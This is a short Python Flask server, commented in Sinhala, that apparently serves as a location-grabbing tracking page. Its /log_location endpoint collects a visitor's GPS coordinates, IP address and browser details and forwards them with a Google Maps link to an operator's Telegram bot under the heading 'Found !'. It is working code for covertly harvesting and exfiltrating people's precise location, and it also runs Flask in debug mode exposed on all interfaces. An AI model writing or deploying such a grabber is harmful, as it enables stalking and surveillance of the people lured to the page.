from flask import Flask, request, render_template
import requests

app = Flask(__name__)

BOT_TOKEN = "your bot token"
CHAT_ID = "your CHAT_ID"

def send_telegram_info(lat, lon, ip, ua):
   
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    
    # Telegram පණිවිඩය සකස් කිරීම
    message = (
        f"🚨 *Found !*\n\n"
        f"📍 *Location:* [Map]({maps_link})\n"
        f"🌐 *IP Address:* `{ip}`\n"
        f"📱 *Device/Browser:* `{ua}`\n"
    )
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown" 
    }
    
    try:
        requests.post(url, data=payload)
        print("✅ send to Telegram!")
    except Exception as e:
        print(f"❌ Telegram Error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log_location')
def log_location():
    # Frontend එකෙන් එවන GPS දත්ත
    lat = request.args.get('lat')
    lon = request.args.get('long')
    
    # අමතර විස්තර ලබා ගැනීම
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    if lat and lon:
        print(f"\n--- found ---")
        print(f"Lat/Lon: {lat}, {lon}")
        print(f"IP: {user_ip}")
        
        # Telegram එකට යැවීම
        send_telegram_info(lat, lon, user_ip, user_agent)
        return "Success", 200
    
    return "No Data", 400

if __name__ == '__main__':
    
    app.run(host='0.0.0.0', port=5000, debug=True)